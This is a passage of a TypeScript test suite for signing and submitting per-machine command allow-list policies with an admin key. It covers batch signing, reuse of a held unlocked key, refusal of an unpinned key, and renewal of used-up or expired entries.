    expect(api.sent).toEqual([]);
  });

  it('an invalid lifetime is refused with the parser message before the key is read', async () => {
    const api = batchApi();
    await expect(signAndSubmitBatch(api, [{ context: context(), entries: [E('ls')] }], { times: '0' }, PASSPHRASE, NOW)).rejects.toThrow();
    expect(api.sent).toEqual([]);
  });

  it('an older module backend (no notice list in the context): the result of that machine says the list was not sent', async () => {
    const api = batchApi();
    const { noticeRecipients: _omit, ...older } = laptopContext();
    const outcomes = await signAndSubmitBatch(api, [{ context: older as AllowContext, entries: [E('ls')] }], {}, PASSPHRASE, NOW);
    expect(outcomes[0]).toMatchObject({ status: 'posted', result: { noticeRecipients: 'skipped' } });
  }, 120_000);
});

describe('prepareBatch (what the form checks before the passphrase is typed)', () => {
  it('says per machine whether anything would be signed, and reads nothing', async () => {
    const ctx = context({ current: signedBase(1, [{ shell: SHELL, command: 'ls' }]) });
    const prepared = await prepareBatch([{ context: ctx, entries: [{ shell: SHELL, command: 'ls' }] }, { context: context({ target: { uuid: PEER, name: 'laptop' } }), entries: [{ shell: SHELL, command: 'ls' }] }], {}, NOW);
    expect(prepared).toEqual([{ machine: { uuid: SELF, name: 'desktop' }, changed: false }, { machine: { uuid: PEER, name: 'laptop' }, changed: true }]);
  });

  it('refuses a command the policy cannot hold, naming the machine', async () => {
    await expect(prepareBatch([{ context: context(), entries: [{ shell: SHELL, command: `x${String.fromCharCode(233)}` }] }], {}, NOW)).rejects.toThrow(/on "desktop": command.*printable ASCII/s);
  });
});

describe('the held key (decision 92): one unlock serves the next signatures, the passphrase is not asked again', () => {
  const keyReads = (api: ReturnType<typeof stubApi>) => api.sent.filter((s) => s.method === 'GET' && s.path === '/admin-key').length;

  it('the first Allow with the passphrase keeps the key (default 5 min); the next ones pass null: no key file read, no unlock, a valid policy, the idle timeout restarts', async () => {
    adminKeyHolder.reset();
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    await signAndSubmitAllow(api, context(), { shell: SHELL, command: 'ls' }, PASSPHRASE, NOW);
    const held = adminKeyHolder.current();
    expect(held).not.toBeNull();
    expect(held?.isLocked()).toBe(false);
    expect(keyReads(api)).toBe(1);
    const firstExpiry = adminKeyHolder.snapshot().expiresAt as number;
    await new Promise((r) => setTimeout(r, 15));

    const ctx = context({ current: signedBase(1, [{ shell: SHELL, command: 'ls' }]) });
    const answer = await signAndSubmitAllow(api, ctx, { shell: SHELL, command: 'uptime' }, null, NOW);
    expect(answer).toMatchObject({ ok: true });
    expect(keyReads(api)).toBe(1);
    expect(adminKeyHolder.current()).toBe(held);
    expect(adminKeyHolder.snapshot().expiresAt as number).toBeGreaterThan(firstExpiry);
    const policy = (api.sent.filter((s) => s.method === 'POST')[1]?.body as { policy: SignedPolicy }).policy;
    expect(applyPolicy({ version: 1, highestSeen: 1 }, policy, { mode: 'admin', adminPublicKey: admin.publicKey, now: NOW, targetUuid: SELF }).ok).toBe(true);
    adminKeyHolder.reset();
  }, 120_000);

  it('"ask every time": the key is locked after the signature and nothing is kept', async () => {
    adminKeyHolder.reset();
    adminKeyHolder.setKeep('ask');
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    await signAndSubmitAllow(api, context(), { shell: SHELL, command: 'ls' }, PASSPHRASE, NOW);
    expect(adminKeyHolder.current()).toBeNull();
    expect(adminKeyHolder.snapshot().unlocked).toBe(false);
    adminKeyHolder.reset();
  }, 120_000);

  it('null while locked says so with the fix, and nothing is read, signed or posted', async () => {
    adminKeyHolder.reset();
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    await expect(signAndSubmitAllow(api, context(), { shell: SHELL, command: 'ls' }, null, NOW)).rejects.toThrow(/admin key is locked.*type the admin passphrase/is);
    expect(api.sent).toEqual([]);
  });

  it('a wrong passphrase keeps nothing', async () => {
    adminKeyHolder.reset();
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    await expect(signAndSubmitAllow(api, context(), { shell: SHELL, command: 'ls' }, 'not the passphrase', NOW)).rejects.toThrow();
    expect(adminKeyHolder.current()).toBeNull();
  }, 120_000);

  it('a key unlocked from ANOTHER key file than the pinned one is refused and not kept', async () => {
    adminKeyHolder.reset();
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    await expect(signAndSubmitAllow(api, context({ adminKeyId: 'f'.repeat(32) }), { shell: SHELL, command: 'ls' }, PASSPHRASE, NOW)).rejects.toThrow(/not the admin key pinned/);
    expect(adminKeyHolder.current()).toBeNull();
    expect(api.sent.filter((s) => s.method === 'POST')).toEqual([]);
  }, 120_000);

  it('the batch signs with the held key too (null): no key file read, one policy posted per machine', async () => {
    adminKeyHolder.reset();
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    await signAndSubmitAllow(api, context(), { shell: SHELL, command: 'ls' }, PASSPHRASE, NOW);
    expect(keyReads(api)).toBe(1);
    const outcomes = await signAndSubmitBatch(api, [{ context: context({ current: signedBase(1, [{ shell: SHELL, command: 'ls' }]) }), entries: [{ shell: SHELL, command: 'a' }, { shell: SHELL, command: 'b' }] }], {}, null, NOW);
    expect(outcomes).toMatchObject([{ status: 'posted' }]);
    expect(keyReads(api)).toBe(1);
    adminKeyHolder.reset();
  }, 120_000);
});

describe('the Allow of a renewal (an exhausted or expired entry): one signed policy replaces the entry', () => {
  const used: PolicyBody['defaults'] = [{ shell: SHELL, command: 'orch stop', limits: { maxCalls: 1 } }, { shell: SHELL, command: 'uptime' }];
  const renewal = { entry: 'orch stop', typed: false, own: false };

  it('prepareAllow equals machine-core nextPolicyBody with renew, replaces the entry (same limits) and never reads "already allowed"', async () => {
    const current = signedBase(4, used);
    const prepared = await prepareAllow(context({ current }), { shell: SHELL, command: 'orch stop', renewal, lifetime: { times: '1' } }, NOW);
    const core = coreNext(current.body, { target: SELF, adminKeyId: ADMIN_KEY_ID, now: NOW }, { kind: 'allow', renew: true, entry: { shell: SHELL, command: 'orch stop', limits: { maxCalls: 1 } } });
    expect(prepared.changed && core.changed ? prepared.body : null).toEqual(core.changed ? core.body : undefined);
    if (!prepared.changed) {
      throw new Error('expected a change');
    }
    expect(prepared.body.defaults).toEqual([{ shell: SHELL, command: 'orch stop', limits: { maxCalls: 1, renewals: 1 } }, { shell: SHELL, command: 'uptime' }]);
    expect(prepared.body.v).toBe(2);
    expect(prepared.added).toEqual([]);
    expect(prepared.renewed).toHaveLength(1);
    expect(prepared.summary).toBe('renews "orch stop": 1 call -> 1 call (the counter starts again)');
  });

  it('a typed entry is renewed by its template, not by the command of the request', async () => {
    const current = coreSignPolicy({ v: 2, target: SELF, version: 4, baseVersion: 3, adminKeyId: ADMIN_KEY_ID, issuedAt: NOW - 60, notBefore: NOW - 60, notAfter: NOW + 86400, defaults: [{ shell: SHELL, template: 'orch logs <j:name>', limits: { expiresAt: NOW - 5 } }], peers: {} }, admin.privateKeyPkcs8);
    const prepared = await prepareAllow(context({ current }), { shell: SHELL, command: 'orch logs abc', renewal: { entry: 'orch logs <j:name>', typed: true, own: false }, lifetime: { for: '1h' } }, NOW);
    if (!prepared.changed) {
      throw new Error('expected a change');
    }
    expect(prepared.body.defaults).toEqual([{ shell: SHELL, template: 'orch logs <j:name>', limits: { expiresAt: NOW + 3600, renewals: 1 } }]);
    expect(prepared.summary).toMatch(/^renews "orch logs <j:name>": expired \(was until .*\) -> until /);
  });

  it('own list: the list of that peer is edited, the default list is untouched', async () => {
    const current = signedBase(4, [{ shell: SHELL, command: 'uptime' }], { [PEER]: [{ shell: SHELL, command: 'orch stop', limits: { maxCalls: 1 } }] });
    const prepared = await prepareAllow(context({ current }), { shell: SHELL, command: 'orch stop', renewal: { entry: 'orch stop', typed: false, own: true, peer: PEER }, lifetime: { times: '3' } }, NOW);
    if (!prepared.changed) {
      throw new Error('expected a change');
    }
    expect(prepared.body.defaults).toEqual([{ shell: SHELL, command: 'uptime' }]);
    expect(prepared.body.peers[PEER]).toEqual([{ shell: SHELL, command: 'orch stop', limits: { maxCalls: 3, renewals: 1 } }]);
  });

  it('a plain allow has no summary and no renewed entry', async () => {
    const prepared = await prepareAllow(context(), { shell: SHELL, command: 'uptime' }, NOW);
    expect(prepared.changed && prepared.summary).toBeUndefined();
    expect(prepared.changed && prepared.renewed).toEqual([]);
  });

  it('signs and posts the renewed policy: machine-core accepts it (version 2 body) and the entry exists once', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    await signAndSubmitAllow(api, context({ current: signedBase(4, used) }), { shell: SHELL, command: 'orch stop', renewal, lifetime: { times: '1' } }, PASSPHRASE, NOW);
    const policy = (api.sent.find((s) => s.method === 'POST')?.body as { policy: SignedPolicy }).policy;
    expect(policy.body.defaults.filter((e) => 'command' in e && e.command === 'orch stop')).toEqual([{ shell: SHELL, command: 'orch stop', limits: { maxCalls: 1, renewals: 1 } }]);
    expect(applyPolicy({ version: 4, highestSeen: 4 }, policy, { mode: 'admin', adminPublicKey: admin.publicKey, now: NOW, targetUuid: SELF }).ok).toBe(true);
  }, 120_000);

  it('a batch holds the renewals and the new entries in ONE version; two requests of one entry renew it ONCE', async () => {
    const api = stubApi({ get: { '/admin-key': { file: keyFile } } });
    api.post = async (path: string, body: unknown) => {
      api.sent.push({ method: 'POST', path, body });
      return { ok: true, target: { uuid: SELF, name: 'desktop' }, version: 5, delivery: 'installed' };
    };
    const groups = [{ context: context({ current: signedBase(4, used) }), entries: [{ shell: SHELL, command: 'orch stop', renewal }, { shell: SHELL, command: 'orch stop', renewal }, { shell: SHELL, command: 'df -h' }] }];
    await signAndSubmitBatch(api, groups, { times: '1' }, PASSPHRASE, NOW);
    const policy = (api.sent.find((s) => s.method === 'POST')?.body as { policy: SignedPolicy }).policy;
    expect(policy.body.version).toBe(5);
    expect(policy.body.baseVersion).toBe(4);
    expect(policy.body.defaults).toEqual([
      { shell: SHELL, command: 'orch stop', limits: { maxCalls: 1, renewals: 1 } },
      { shell: SHELL, command: 'uptime' },
      { shell: SHELL, command: 'df -h', limits: { maxCalls: 1 } },
    ]);
    expect(applyPolicy({ version: 4, highestSeen: 4 }, policy, { mode: 'admin', adminPublicKey: admin.publicKey, now: NOW, targetUuid: SELF }).ok).toBe(true);
  }, 120_000);
});

describe('signingsSettled: nothing is in flight when it resolves', () => {
  it('resolves at once when no signing runs, and waits for the end of a tracked one (done or failed)', async () => {
    await signingsSettled();
    let release: () => void = () => undefined;
    const running = trackSigning(() => new Promise<void>((resolve) => { release = resolve; }));
    let settled = false;
    void signingsSettled().then(() => { settled = true; });
    await Promise.resolve();
    expect(settled).toBe(false);
    release();
    await running;
    await signingsSettled();
    expect(settled).toBe(true);
    await expect(trackSigning(() => Promise.reject(new Error('boom')))).rejects.toThrow('boom');
    await signingsSettled();
  });
});
